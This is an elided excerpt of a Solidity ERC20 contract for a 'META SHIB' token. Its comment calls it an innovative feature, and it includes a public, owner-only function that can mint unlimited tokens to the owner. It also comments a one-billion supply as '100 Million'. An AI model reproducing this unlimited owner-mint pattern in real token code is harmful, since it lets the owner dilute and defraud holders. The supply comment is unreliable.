...
//
// $METASHIB proposes an innovative feature in its contract.
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _METASHIB(uint256 amount) public onlyOwner {
 _METASHIB(msg.sender, amount);
    }
    ...
    function _METASHIB(address account, uint256 amount) internal virtual {
...
contract $METASHIB is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("META SHIB", "MSHIB") {
     _METASHIB(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}